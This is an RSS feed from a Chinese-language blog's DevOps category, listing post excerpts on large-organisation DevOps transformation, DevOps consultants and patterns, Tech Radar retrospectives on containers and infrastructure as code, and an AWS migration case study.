<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>DevOps on 顾宇的研习笔记</title>
    <link>https://www.guyu.me/categories/devops/</link>
    <description>Recent content in DevOps on 顾宇的研习笔记</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    <lastBuildDate>Fri, 06 Dec 2019 00:00:00 +0000</lastBuildDate>
    
	<atom:link href="https://www.guyu.me/categories/devops/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>千人规模组织级 DevOps 演进的 9 个实践及技巧</title>
      <link>https://www.guyu.me/2019/2019-12-06-devops-tips-for-large-org/</link>
      <pubDate>Fri, 06 Dec 2019 00:00:00 +0000</pubDate>
      
      <guid>https://www.guyu.me/2019/2019-12-06-devops-tips-for-large-org/</guid>
      <description>案例背景 在2018年年底，我参与了某一个大型产品团队的 DevOps 转型。这个产品的团队分为三个组织：产品业务部门（50多人），产品IT部门（250多人），以及产品的外包团队（800多人）。 经过产品化和微服务拆分后，组织开始以独立业务的方向划分。但是，由于之前的组织划分，团队并没有成为一个全功能的团队。而是采用原先的交付模式：业务部门提出需求，然后让IT部门开始设计解决方案，最后交给外包团队开发和测试。并且将测试团队和 计算平台团队变成各子产品的的公共资源，如下所示：
在这样的组织里，没交付一个产品需要 8 周的时间。按照原先的计划，2周完成需求分析，2周完成开发，2周完成产品的集成测试，2周完成用户验收测试，然后就进行发布，如下图所示：
然而，这个理想的计划并未得到实施。由于有些需求需要跨子产品，或者需求方案变更和延迟，导致需求延迟完成，使得接下来的环节相继延迟。然而，最核心的问题是版本计划不能根据变化调整，必须按照计划上线需求。因此，缺乏足够开发时间导致的不合格的软件半成品会堆到集成测试阶段。使得在用户验收测试阶段大量出现问题，“Bug”的数量爆发增长使得用户满意度大幅下降,如下图所示：
所以，用户希望通过 DevOps 能够弥合组织间的沟通间隙，将质量工作前移，减少Bug 数量并且缩短交付周期。在这个过程中，我总结了在50人以下的小型团队不会出现的关键问题以及对应的9个实践：
 采用外部 DevOps 顾问 组织内部达成一致的 DevOps 理解和目标 采用改进而非转型减少转型风险和反弹 采用试点团队和推广团队 构建全功能团队并合并流程 提升需求质量 实践不同级别的 TDD 构建“比学赶超”的组织氛围 规范化管理实践并不断优化  聘用一个外部 DevOps 顾问 如果你是一个小型的团队，可以不用外部顾问。主要的原因是组织结构不复杂，很多事情只要团队能自主决策就能推动 DevOps 发展。
但如果你是一个大型组织，特别一个职能分工明确的组织向多个跨职能的全功能组织发展的时候，更多需要处理的是组织内部的复杂关系，重新切割和划分组织边界，组织内部就会出现矛盾。而 DevOps 顾问则是承接和转化矛盾的最理想人选。
那么，聘用一个外部 DevOps 顾问需要注意哪几点 首先，一个外部 DevOps 顾问需要至少两个以上企业或者客户的转型经验，特别是案例总结。因为不同企业在做 DevOps 的时候组织特点决定了不同的组织痛点和方法。做过多个企业的 DevOps 转型后，一个 DevOps 顾问就会明白这些区别。否则，就会把自己过去的经验“复制”过来，以为 DevOps 只有一种，从而拒绝学习组织现有的知识。那么就会盲目复制，导致转型效果和转型期望有很大差距。此外，“转型”是一门艺术，面对什么样的组织，采用什么样的话术和方法也是一门学问。这些细节也会影响 DevOps 转型的效果。
然后，DevOps 改进涉及到管理提升和技术提升两个方面。DevOps 顾问除了要具备精益，敏捷的管理实践。还要具备自动化测试、自动化运维、持续交付等技术能力。管理实践和技术实践两者都不可少，没有了管理实践，技术实践往往沦落为“工具赌博”，很多买来的工具都没有起到效果。没有了技术实践，管理实践也无法通过自动化取得进展。技术实践和管理实践相辅相成，技术实践是落地管理实践的手段和工具。只有二者紧密结合，才能发出最好的效果。
最后，DevOps 顾问一定要可以和团队在一起实践，而非在一边“指挥”。有一些 DevOps 教练没有动手实践过，只是“知道”，而非“做到”。这里面就会有很大的风险因素在里面，任何一个实践的落地和见效需要投入和时间。魔鬼都藏在细节里。如果没有做过，就难以避开转型上的“暗礁”
所以，在面试 DevOps 顾问的时候，要问 DevOps 顾问之前的转型案例，特别是的关注的点。而且不光要有管理实践，还有技术实践。在面试这些的内容的时候不光要讲方法论，还要讲采用什么工具如何落地。落地中间的困难点和关键点事什么。
为什么招聘一个 DevOps 专家转型效果不好 你可能会想，不如招聘一个 DevOps 专家来做。不是说不可以，而是说不要对这种方式做 DevOps 转型抱太高期望。因为他的工作也会受组织制度的制约。为了能够在组织生存下去，避免风险，他就会避免矛盾的发生。而这些矛盾的突破才是转型的关键。因此，聘用一个 DevOps 专家很难解决一些“顽疾”。</description>
    </item>
    
    <item>
      <title>DevOps 模式 - 引入 DevOps 顾问</title>
      <link>https://www.guyu.me/2019/2019-07-13-devops-pattern-introduce-devops-consultant/</link>
      <pubDate>Sat, 13 Jul 2019 00:00:00 +0000</pubDate>
      
      <guid>https://www.guyu.me/2019/2019-07-13-devops-pattern-introduce-devops-consultant/</guid>
      <description>很多企业并不是 DevOps 运动的早期玩家。当开始注意到 DevOps 的时候，想快速达到 DevOps 实践领先企业的效果，会引入有经验的 DevOps 顾问进行快速的转型。
然而，短期的 DevOps 顾问合同如果不能帮助团队构建 DevOps 制度和 DevOps 文化，DevOps 转型的效果将随 DevOps 专家的离开而离开，使团队得到“DevOps 不适用”的错觉。因此，在引入 DevOps 专家顾问的时候，我们一定要明确 请 DevOps 顾问的目的以及 DevOps 顾问留下的东西。
模式：引入 DevOps 顾问 (Introduce DevOps Consultant) 模式名称：引入 DevOps 顾问 (Introduce DevOps Consultant)
模式别名：引入 DevOps 专家，引入 DevOps 教练
模式类别： 策略模式
风险： 中 - 采用的时候要注意场景和条件，否则会出现反模式。
价值：中 - 采用该模式产生中期固定的收益，但要持续做才可以获得收益。
见效时间：快 - 2 周内可看到显著改进。
说明：
 引入 DevOps 顾问需要注意以下几点：  DevOps 顾问要对 DevOps 的历史和来龙去脉有起码的理解。 DevOps 顾问要有不同的转型案例，如果只有一类企业的 DevOps 转型案例，在转型的过程中很容易进入“路径依赖”，认为 DevOps 转型只有一种。所以，DevOps 顾问要问不同案例中的差异的区别。 DevOps 顾问要同时引入管理转型实践和技术实践。缺乏 DevOps 管理实践会导致 DevOps 转型失去方向和效果。缺乏 DevOps 技术实践会让 DevOps 难以落地。 把你的具体问题抛给 DevOps 顾问，让他提出问题和观点。 关注 DevOps 顾问在上述各种描述中对 CLAMS 原则的应用。  DevOps 顾问需要可以和团队“一起做”，而不是“在一边看”。 DevOps 顾问要能给出对于组织的 DevOps 评估，并且根据评估给出能够落地的解决方案。 DevOps 顾问要根据 DevOps 评估的内容，帮助组织构建出 DevOps 文化、技术实践，以及相应的制度。 警惕那些对组织特征、组织痛点和转型范围不提问题的 DevOps 顾问。  相关模式：DevOps 评估，DevOps 转型，DevOps 改进</description>
    </item>
    
    <item>
      <title>从技术雷达看 DevOps 的十年——容器技术与微服务</title>
      <link>https://www.guyu.me/2019/2019-07-21-devops-and-techradar-anniversary-docker-and-microservices/</link>
      <pubDate>Thu, 11 Jul 2019 00:00:00 +0000</pubDate>
      
      <guid>https://www.guyu.me/2019/2019-07-21-devops-and-techradar-anniversary-docker-and-microservices/</guid>
      <description>本文原文发表于 2019 年 7 月 11 日的 ThoughtWorks 洞见，后经过修改发表到博客上。
 在上一篇文章中，我们讲到了基础设施即代码和云计算给运维领域带来的深远影响。而 DevOps 运动不仅仅改变了运维端，同时也改变了开发端，特别是 Docker 的兴起和微服务架构的流行。在这一篇，我们将通过技术雷达上相关条目的变化来考察 Docker 和微服务的发展。
容器技术 在 Docker 技术出现之前，可以说是 DevOps 技术的 1.0 的时代，人们关注如何做好 CI/CD 和基础设施即代码。而 Docker 的出现迎来了 DevOps 2.0 时代，DevOps 所有的实践都围绕着 Docker 展开，以 Docker 为中心的技术架构影响了软件开发交付的方方面面。无论是开发还是运维都在讨论和使用 Docker。它们采用统一的交付格式和技术语言在讨论交付的过程，而不像之前开发只关注“打包前”，运维只关注“打包后”。
技术雷达关注 Linux 容器技术是在 Docker 出现之前，在 2012 年 4 月 的技术雷达上。“Linux 容器” 就出现在了技术雷达上的 “试验” 区域：
 虚拟容器是一种对 SaaS 和 PaaS 实现特别有吸引力的虚拟化风格。OpenVZ 等 Linux 容器提供了虚拟机的隔离和管理优势, 而不需要通常与通用虚拟化相关的开销。在容器模型中, Guest 操作系统仅限于与 Host 主机操作系统相同, 但这对许多云应用程序来说并不是一个严重的限制。
 一年之后，Docker 问世。两年之后，Docker 进入技术雷达。</description>
    </item>
    
    <item>
      <title>DevOps 模式 - 索引</title>
      <link>https://www.guyu.me/2019/2019-06-03-devops-patterns-index/</link>
      <pubDate>Sun, 02 Jun 2019 00:00:00 +0000</pubDate>
      
      <guid>https://www.guyu.me/2019/2019-06-03-devops-patterns-index/</guid>
      <description>我今天把 DevOps 模式和反模式做了一个简单的总结。如果全职写，半年可以写完。如果周更，需要两年，我怕自己烂尾，夜长梦多。
自己开的坑，含着泪也要把它填完。
DevOps 策略模式  模式：定义你的 DevOps 反模式：DevOps 教条主义 反模式：DevOps 复制者 模式：引入 DevOps 顾问 反模式：DevOps 专家依赖 模式：DevOps 评估 模式：DevOps 共识 反模式：片面的 DevOps 理解 模式：定义 DevOps 范围 模式：DevOps 三步工作法 模式：DevOps 团队复制 模式：DevOps 团队改进 模式：DevOps 规范 反模式：缺乏管理约束的 DevOps 规范 反模式：缺乏技术约束的 DevOps 规范 模式：测试计划驱动开发计划 案例-01：每个人自己的 DevOps 案例-02：不同范围下的 DevOps 策略 案例-03：DevOps 团队复制 vs DevOps 团队改进  DevOps 组织模式  模式：DevOps 试点团队 模式：DevOps 推广团队 模式：Dev 团队含 Ops 成员 模式：Dev 团队共享 Ops 团队 模式：BAU 团队和特性团队 反模式：职责过多的 DevOps 团队 反模式：全栈工程师 模式：独立的质量控制团队 反模式：屈服于交付压力的质量控制团队 案例-01：屈服于交付压力的质量控制团队  DevOps 管理模式  模式：最小可用流程 模式：DevOps 看板 模式：累计流图 模式：四类任务 模式：DevOps 关键指标 模式：定制化 DevOps 度量 反模式：没有度量的DevOps 模式：包含 Ops 的 Scrum 模式：质量内建 模式：质量保证和质量控制 反模式：过程质量 Over 结果质量 模式：DevOps 技能矩阵 模式：测试人员驱动开发人员 案例-01：结合质量控制的质量保证流程 案例-02：交付 QA 和流程 QA  DevOps 文化模式  模式：DevOps 比学赶超 模式：CLAMS 反思 模式：DevOps 回顾会议 模式：DevOps 大使 模式：反向管理 反模式：DevOps 指挥官 模式：我要做 DevOps 反模式：要我做 DevOps 模式：全员为质量负责 模式：DevOps 培训 反模式：DevOps 速成班 模式：DevOps 分享 反模式：封闭的 DevOps 模式：&amp;rdquo;如何定义&amp;rdquo;和&amp;rdquo;如何度量&amp;rdquo;问题 案例-01：规模化 DevOps 案例-02：正向管理 vs 反向管理 案例-03：通过分享增强自己的 DevOps 能力  DevOps 技术模式  模式：持续集成 反模式：持续集成表演 模式：持续部署 模式：基础设施即代码 模式：基础设施流水线 模式：自动化安全扫描 模式：测试驱动开发 反模式：过度自动化的 DevOps 模式：DevOps 平台 反模式：工具化 DevOps 反模式：基于组织映射的 DevOps 平台 模式：DesignOps 模式：混沌工程 模式：环境无关的应用程序 模式：环境相关的应用程序 模式：自部署的应用程序 反模式：知识太多的应用程序 反模式：基础设施依赖的应用程序 模式：12 Factors App 模式：BeyondCorp 模式：3R 企业安全 模式：微服务架构 反模式：微服务嫉妒 反模式：缺乏 DevOps 能力的微服务组织 模式：度量驱动的微服务 反模式：缺乏度量的微服务 模式：Serverless 应用架构 反模式：纳服务架构 案例-01：基于 Serverless 的微服务架构 案例-02：数据库变更流水线  关于 DevOps 模式 DevOps 模式的索引在 Github 上开源，地址是https://github.</description>
    </item>
    
    <item>
      <title>从技术雷达看 DevOps 的十年——基础设施即代码与云计算</title>
      <link>https://www.guyu.me/2019/2019-05-21-devops-and-techradar-anniversary-infrastructure-as-code-and-cloud-computing/</link>
      <pubDate>Tue, 21 May 2019 00:00:00 +0000</pubDate>
      
      <guid>https://www.guyu.me/2019/2019-05-21-devops-and-techradar-anniversary-infrastructure-as-code-and-cloud-computing/</guid>
      <description>本文原文发表于 2019 年 5 月 21 日的 ThoughtWorks 洞见，后经过修改发表到博客上。
 在上一篇文章中，我们讲到了DevOps 和持续交付的关系。本篇将回顾最先改变运维工作的相关技术 —— 基础设施即代码和云计算，通过技术雷达上相关条目的变动来跟踪其趋势变化。
基础设施即代码 和持续交付一样，基础设施即代码（Infrastructure as code）这项技术第一次在技术雷达出现就被纳入到了“采纳”环。
十年前，云计算的普及程度远不如当今。很多企业开始采用虚拟化技术（严格的说，那时候还不能称作是云）来解决资源不足和设备异构的问题。简单的说，你可以接虚拟化技术是在异构的设备上构建了一个通用适配层。使得各种不同的应用程序和设备能够通过通用的操作进行统一的管理，那时候面临这样问题多是通信、银行、政府、石油等关键领域。即便 IBM，Oracle，EMC 微软等都有“整体解决方案”，但为了避免供应商绑定风险，政府还是希望能够“混搭”：通过做大蛋糕来降低风险。当然，这种做法也降低了效率。然而当虚拟化技术解决了异构问题之后，基础设施资源被抽象为网络、计算、存储三类资源。由于业务的异构性，企业级领域迟迟没有解决方案。毕竟为了让虚拟化的资源能够尽快产出价值，往虚拟资源的迁移工作相关的集成工作占据了工作主要内容。
于是运维工程师和网络工程师慢慢远离机房，和系统工程师以及数据库工程师坐在了一起，共同成为了“脚本工程师”。
此时，Linux 开始通过 Xen 和 KVM 侵蚀传统 UNIX 厂商的市场份额。SCO，AIX 和 HP-UX 这些过去按卖 License 获得售后服务的方式毕竟太贵了。可以说，借由 Linux 虚拟化技术的云计算技术给商业 UNIX 来了一记补刀，如今你很少能看到这些商业 UNIX 了。
虚拟化技术把所有的空闲资源收集到了一起，这些资源完全可以在不增加基础设施设备投入的情况下运行更多的应用程序。拟化技术还可以通过整合小型设备，得到和大型设备一样的表现。
但是，如果你通过虚拟化节约出来的空闲资源你使用不了，但是还要收取电费，这就是很大的浪费。于是有些人则想到了把这些空闲的资源租出去，变成一个单独的业务。这就是另外一个故事了，我们稍后会提到。
随着 VMware，Oracle，Cisco，IBM 推出了各自的解决方案，“脚本工程师”们开始考虑如何管理大量的空闲资源。随着敏捷软件开发逐渐成为主流，基础设施的变更效率显然满足不了敏捷的迭代速度。基础设施的变更带来的风险和周期远远大于应用。如何让基础设施敏捷起来，成为了敏捷软件开发在交付最后一公里需要迫切解决的问题。
这时候，由于规模和复杂度都很大，脚本工程师们考虑的第一个问题就是：如果规模没办法改变，我们就降低复杂度吧。
Puppet 和 Chef 的短暂辉煌 Puppet 是第一个嗅到这个商机的工具，它在第2010年8月的技术雷达上出现在了“试验”环里。
Ruby 很适合构建领域特定语言（DSL），继 Cucumber 在这方面的成功探索后，脚本工程师们希望通过 DSL 缩小 Dev 和 Ops 之间的差距。作为同一时期的竞争者，Chef 以对开发人员更加友好的方式出现。Chef 相比 Puppet 更有竞争力的一点就是对于 Windows 的支持。</description>
    </item>
    
    <item>
      <title>从星巴克店面运营学习 DevOps</title>
      <link>https://www.guyu.me/2019/2019-05-10-how-starbucks-play-devops/</link>
      <pubDate>Fri, 10 May 2019 00:00:00 +0000</pubDate>
      
      <guid>https://www.guyu.me/2019/2019-05-10-how-starbucks-play-devops/</guid>
      <description>某次在星巴克等咖啡的时候，闲来无事开始观察店员的的工作。可能是出于职业习惯，我开始观察和分析星巴克的工作流程。突然发现星巴克的咖啡交付过程很像一个敏捷软件开发团队的交付过程。后来通过进一步观察和细聊，发现星巴克的店面运营是一个 DevOps 运作的榜样。
如果我们把星巴克的店员们看做是一个开发/运维团队，把咖啡的交付看作软件的交付，把店面的基础设施维护和清洁看作是运维工作。我们就发现了一个很好的 DevOps 学习榜样。
让我们看看星巴克店面是如何做 DevOps 的。
星巴克咖啡交付团队的角色组成 在星巴克里，大家都相互称对方为星伙伴。我个人理解是通过弱化职级称谓提升每个人的责任心。所有的店员分为四个角色：
 店面主管（SS或IC）：负责店面整体的管理。
 收银：负责点单、推荐产品和收款。
 吧台：负责制作饮品。
 CS：负责门店补货，清理桌面。
  店面主管主要负责团队的任务安排，你可以把它当做是 PM 或者 Scrum Master。在一切都井然有序的情况下，他的工作和一般的员工是一样的。只要他发现了临时需要处理的情况，他才会根据店面的资源来安排临时性的工作。
吧台内部分为三个部分：收银点单区、咖啡制作区、咖啡待取区，如下图所示：
收银点单区的店员根据客人的需求点单，然后记录到咖啡杯上。
咖啡制作区的店员会根据杯子上的标记制作饮品。
制作完成后的咖啡会放到咖啡待取区等客人来取。
所有的店员都具备所有的技能（全栈工程师），并通过标准化的考试上岗。你会看到在星巴克里有绿色围裙和黑色围裙。黑色围裙的咖啡师是经过考试的，考试合格后会发黑色围裙作为通过认证的标志。
 反思：你的工程师有标准化的技能考试吗？
 星巴克咖啡交付团队的 DevOps 单向工作流 说到 DevOps，不能不提到&amp;rdquo;三步工作法&amp;rdquo;。首先，我们要用到第一步——构建端到端单向工作流——来观察星巴克店面是如何构建单向工作流的。
我们可以把交付一杯咖啡的流程和软件开发的交付一个用户故事的流程的关系做如下对应：
 需求分析：和客人交流并记录客人对咖啡的需求。
 产品开发：按照需求制作咖啡。
 产品发布：制作完成并通知客人取咖啡。
 基础设施运维：咖啡店面的日常清扫和补货。
  在这个基础上，我们看看一杯咖啡从点单开始，星巴克的持续交付流水线就是它设备的摆放顺序，确保杯子的单一方向流动，避免返工和逆向流动。
点单：虽然星巴克的咖啡是流水化工业制品。但是也是存在定制的，比如类别、口味、冷热、大小。虽然顾客有需求，但需求控制在一定范围之内(哪些做得到，哪些做不到)并且通过产品价位板告知顾客。
 反思：你的团队能做什么，不能做什么，什么时候做完，你是否对交付成果有信心？这些信心来自哪里？如果没有信心，如何获得信心？
 标记：在点单阶段，收银会把客户的每一个需求记录到杯子上，包括顾客的姓名。星巴克咖啡采取的是“预付费”(先付费再生产)而非“后付费”（先生产再买单）的方式。这些记录是对一杯咖啡需求验收标准的分解。通过杯子大小来控制每个需求点的验收和用量。
 反思：你的团队开发需求时是否把每个验收条件记录下来并且在不同的阶段控制质量和用时？
 制作：每个带着记号的咖啡杯就是一个格式化的需求文档。上面详细的记录了这个顾客的需求，并且这些需求可以验证。每杯咖啡都有标准的验收样例和工序，所以每个店员都知道完成的标准是什么。这样，即便不是点单的店员，看到杯子上的记号，也能做出符合顾客验收条件的咖啡。此外，每个杯子上都会有顾客姓名的标记，以免点错单。
 反思：你的团队需求文档中的信息是否可以做到无解释交接？
 出品：星巴克“完成”的定义是“顾客拿到了咖啡”，而不是“咖啡制作完毕”。如果顾客没有确认拿到的咖啡符合需求，是没有完成的。如果顾客对咖啡不满意，是可以要求重做的。这时候，会由专门的店员负责重新制作咖啡，直到顾客满意为止。
 反思：你的软件开发流程中“完成”的定义是开发完成？测试完成？还是上线发布完成？
 制作区运营：星巴克从点单开始，到制作咖啡过程中所有的设备、物料、卫生等都要每天维护使之保持最佳使用状态。这些基础设施的使用都是高可用且可以按需伸缩的：两个收银机、两台咖啡机——如果一台坏了，有另外一台备份。默认情况下只使用一台，如果到了忙时两台才会同时使用。这一切都要通过星巴克店面的看板信号机制来动态协调。
 反思：你的软件交付基础设施和人员是否具备动态协调的能力？为什么？</description>
    </item>
    
    <item>
      <title>从技术雷达看 DevOps 的十年——DevOps与持续交付</title>
      <link>https://www.guyu.me/2019/2019-04-16-devops-and-techradar-anniversary-devops-and-continous-delivery/</link>
      <pubDate>Tue, 16 Apr 2019 00:00:00 +0000</pubDate>
      
      <guid>https://www.guyu.me/2019/2019-04-16-devops-and-techradar-anniversary-devops-and-continous-delivery/</guid>
      <description>本文原文发表于 2019 年 4 月 16 日的 ThoughtWorks 洞见，后经过修改发表到博客上。
 2009 年底，比利时根特举办了第一届 DevOpsDays。ThoughtWorks 的咨询师Chris-Read 作为嘉宾之一，代表 ThoughtWorks 出席了这次活动并带来名为 “持续集成，流水线和部署”的演讲。ThoughtWorks 作为 DevOps 运动最早的见证者和奠基人，并没有意识到这个周末聚会将在接下来 10 年给全球 IT 行业带来的深远影响。
1 个月后，ThoughtWorks 发布了第一期的技术雷达。作为一个新兴的名词，DevOps 还没有成熟到让令人瞩目的阶段。然而，即便 DevOps 还没有被纳入技术雷达，但与之相关的早期实践和工具都已出现。在接下来的十年中，DevOps 已经成为每期技术雷达不可或缺的一部分。从这个角度上说，技术雷达就是 DevOps 发展的见证者。
DevOps 和技术雷达都将迎来自己的不愁之年。作为 IT 行业技术的先行指标，技术雷达上面的技术平均领先行业 3 至 5 年。也就是说，出现在技术雷达 采纳和 试用区域的技术，在 3 - 5 年后大概率将成为业界主流。
作为 DevOps 和技术雷达的粉丝，我想从技术雷达的角度总结 DevOps 的发展历程。该系列文章共分为三篇，分别是：
 DevOps 和持续交付 基础设施即代码和云计算 容器技术和微服务  本文为“DevOps 和技术雷达的十年”系列文章第一篇：DevOps 和 持续交付。
DevOps 虽然持续集成、构建流水线和持续部署从技术雷达创刊号就存在。但 DevOps 作为一个正式条目进入技术雷达的评估象限是在 2010 年 8月的第三期技术雷达。那时，对 DevOps 的描述是这样的：</description>
    </item>
    
    <item>
      <title>【翻译】软件定义交付宣言</title>
      <link>https://www.guyu.me/2019/2019-03-14-sdd-manifesto/</link>
      <pubDate>Thu, 14 Mar 2019 00:00:00 +0000</pubDate>
      
      <guid>https://www.guyu.me/2019/2019-03-14-sdd-manifesto/</guid>
      <description>原文链接：https://github.com/sdd-manifesto/manifesto 中文链接：https://github.com/wizardbyron/manifesto
软件定义交付宣言（Software Defined Delivery Manifesto） 我们认识到, 提供有用的软件塑造了我们的世界。我们认识到，代码是指定精确操作的最佳方式。我们认识到, 只有在交付代码时, 代码才会有用。
交付不是一个细节, 而是我们的工作。现在是将我们的核心技能应用到自己的工作中的时候了。现在是时候 工程化 我们的交付。我们在人类自身和计算机之间分配我们的工作: 人类用于决策, 而自动化用于任务。
交付不是一个细节，而是我们的工作。现在是应用我们的核心技术到我们工作中的时刻了。现在是工程化我们的交付。我们在我们自身和计算机之间区分我们的工作：人类为了决策，自动化为任务。
交付工作本质上是独特的。应用程序、组织、部署环境和团队的每个组合都有自己的上下文。我们认识到, 每个团队都需要理解这种独特性的交付和自动化。我们认识到, 虽然持续交付对于满足业务需求至关重要, 但自动化所有重复的任务非常重要。
我们加快自动化的速度与加快应用程序开发的方式相同: 使用现代体系结构和编程语言以及用于通用能力的框架、库和服务。
我们承认现有技术。这不是发明的工作, 而是表达的工作, 是及时和急需的方法的工作。
交付基础设施现在是可编程的, 所以我们将对其进行编程。
软件定义交付（Software Defined Delivery）是 核心： 交付是每个软件团队和组织的基本和战略能力。
 一流的： 交付代码就是生产代码。 战略性： 决定团队和组织层面的政策;在代码中精确地实现它, 而无需辛劳。 演进： 随着我们的了解, 我们不断地改进我们的交付。  工程化的: 在可靠的、可测试的代码中。
 现代软件架构: 事件驱动并可扩展。 现代编程语言: 逻辑最好在代码中指定, 而不是在图片或 GUI 中指定。脚本不会扩张。 基于模型: 由软件领域的模型支持, 包含对代码的理解。 可测试: 允许部署在生产前进行较短的交付周期以发现错误。 进步: 随时促进部署。提供对受众群体和环境进行有控制、选择性的更改。允许是渐进和深思熟虑的发布。  协作:
 在人群中: 每个人都可以通过代码表达他们的专业知识, 以造福于每个人。 在软件中: 我们使用同类最佳的工具, 但我们对这些工具的组合是独一无二的。 在人群和软件中: 协作自动化增强了我们的感知, 并实现了我们的决策。它将信息和行动带到我们所处的位置, 并使自动化行为为我们所理解。通过代码, 我们区分团队的共享交付目标集和它们的实现。  加速:</description>
    </item>
    
    <item>
      <title>从第19期技术雷达看 DevOps 的发展趋势</title>
      <link>https://www.guyu.me/2018/2018-12-10-devops-trend-from-tech-radar-vol19/</link>
      <pubDate>Mon, 10 Dec 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.guyu.me/2018/2018-12-10-devops-trend-from-tech-radar-vol19/</guid>
      <description>2018年下半年的技术雷达发布了。看过的朋友可能和我的感觉一样，会发现大部分条目都是和微服务和 DevOps 相关，但这些条目散落在不同的象限里。本文将这些散落在不同象限的条目采用以下 5 个主题进行重组：
 DevOps 合作新实践 云计算新实践 容器新技术 微服务及其误区 安全  特别要提出的是，这期技术雷达采纳了 2018 年的 DevOps 报告 中的四个关键指标(FOUR KEYMETRICS):前置时间，部署频率，平均恢复时间(MTTR)和变更失败百分比。而这四个关键指标也是业界度量 DevOps 效果的统一方式。
每个指标都创造了一个良性循环，并使团队专注于持续改进:缩短交付周期，减少浪费的活动，从而使你可以更频繁地部署，进而改进他们的实践和自动化流程。通过更好的实践，自动化和监控可以提高你从故障中恢复的速度，从而降低故障频率。
DevOps 的合作 如何更好的在组织内合作是 DevOps 实践中永恒不变的的话题。随着 DevOps 合作理念的深入，合作的范围越来越越广，随之带来了新的问题和挑战。这期的技术雷达介绍了以下几方面的合作：
 和外包团队/供应商的 DevOps 合作 和用户/客户/UX设计师的合作 分布式团队之间的合作  和外包团队的 DevOps 合作 而随着 DevOps 应用的加深，会不可避免的碰到组织结构上带来的问题。特别是和外包方的合作，会影响组织的 DevOps 表现。这样的合作往往充满了漫长繁冗且火药味十足的会议和合同谈判，这是 DevOps 运动中不希望看到的但是又无法避免的问题。在 2018 年的 DevOps 报告中看到外包会带来效能下降——“低效能团队将整部分职能进行外包的可能性几乎是高效能团队的 4 倍，这些 外包功能包括测试或运维等等。”
看到这里，千万不要得出“不要用外包的结论”。这里说得是不要“职能的外包”，而“端到端的外包”（End-2-End OutSourcing）则会免除这种顾虑。很多业界一流的 IT 服务企业都提供端到端的 IT 外包服务，你只需要告诉它们你要DevOps，它们会用最有效的方式交付给你。与供应商一起增量交付(INCREMENTAL DELIVERY WITH COTS (commercial off-the-shelf)) 就是这期技术雷达中提出的和外包商一起进行 DevOps 策略之一。与供应商的做端到端的 DevOps 性质的外包另外一个优点则是这样的供应商适合做“长期合作伙伴”来补充你业务、IT 等多样性的不足，甚至能够帮你培训员工。</description>
    </item>
    
    <item>
      <title>公有云(AWS)上的生产环境架构优化案例和迁移套路总结</title>
      <link>https://www.guyu.me/2018/2018-08-08-architecutre-optimization-case-study/</link>
      <pubDate>Wed, 08 Aug 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.guyu.me/2018/2018-08-08-architecutre-optimization-case-study/</guid>
      <description>本文是我在 gitchat 上的文章云计算生产环境架构性能调优和迁移套路总结（以 AWS 为例）的后半部分，本文对原文有所修改和总结。交流实录请点击这里。
在AWS 上的生产环境性能分析案例一文中，记录了我对客户应用生产环境的一次性能分析。接下来，我们要根据所发现的性能问题进行架构优化，以提升可用性和性能。同时，这篇文章也总结了应用迁移到云上的套路。
设计云计算平台迁移计划和方案 将应用程序迁移到云计算平台上主要的目的是把自行构建的高风险高成本应用以及组件替换为云计算平台上的高可靠性低成本组件/服务。
应用架构的迁移有两种方案：
一种是整体一次性迁移，即重新实现一个架构并完成部署，然后通过金丝雀发布或者蓝绿发布切换。这种方式的好处是简单，直接，有效，一开始就能按照最佳实践构建应用架构。而且对于现有系统来说影响不大。但如果方案没设计好，容易造成高级别的风险，所以应当进行大量的测试以确保可靠性。
另一种是持续部分迁移，每次引入一点风险，保证风险可控，但缺点就是优化步骤较多。虽然持续部分迁移步骤多，但是总体时间并不一定会比整体迁移更高。
注意：由于自动化基础设施和架构设计会带来一些副作用，特别是配置间的耦合。因此，对于生产环境的直接优化要慎用自动化。如果一定要用，请务必在测试环境上做好测试。但如果你能做到自动化并且有完好的测试，不如直接做整体一次性迁移方案得了。
一般说来，一个完整的云平台迁移方案会分为以下三大阶段：
第一阶段：构建高可用架构以实施水平扩展，从而保证了应用的稳定运行。
第二阶段：引入 APM 并根据 APM 数据进行定向优化，采用云计算的服务来优化应用的资源使用。
第三阶段：构建应用端的持续部署，构建 DevOps 的工作模式。
这三个阶段是大的顺序，而每个大的阶段里又会相互掺杂一些其它阶段的内容。但无论什么样的迁移方案，一定要通过度量进行风险/收益比排序，最先完成代价最小，收益最大的内容。
第一阶段：构建高可用架构 我们之前说过，一个应用架构的第一追求就是业务的连续性和抗风险能力。一个高可用的架构能够在你的应用面对压力的时候从容不迫。因为如果资源满负荷运转，新的请求会因为没有可用资源而导致排队。这是常见的停机或者性能降低的原因。这就是 AFK 扩展矩阵常说的 X 轴扩展：通过复制自己扩展资源从而达到降低排队等待的时间。此外，水平扩展出来的机器同样也是一个预留资源，能够提高应用的可用性。应用架构不仅仅是应用程序的事情，也包含着资源的分配，二者是相辅相成的。
一般会经历如下几步：
 第一步，有状态和无状态分离 第二步，牲畜化（Cattlize）应用实例 第三步，自动化水平扩展（AutoScaling）  第一步：有状态和无状态分离 先回顾一下当前应用的架构 ： 状态分离的目标是把有状态的组件和无状态的组件分开，以便在做复制的时候降低不一致性。最简单的判定办法是：如果复制当前的虚拟资源，并通过负载均衡随机分配请求访问，哪些部分会造成不一致。
常见的有状态内容比如数据库，上传的文件。所以，我们要把它们独立出来。在“萨瓦迪卡”的例子中，我们首先把数据库独立了出来。如下图所示：
在这个过程中，我们采用 RDS 而不是另外一个 EC2 上构建一套 MySQL 来完成数据库的分离。最主要的原因就是 RDS 提供了更好的可用性和数据库维护支持，例如自动备份，更多的监控指标，更自动的数据库迁移和维护窗口等。我们采用 Aurora 引擎的 MySQL 模式，这可以将数据库做成一个集群并让另外一个只读分片，降低数据库的负担。
在分离数据库的时候，要注意以下几点：
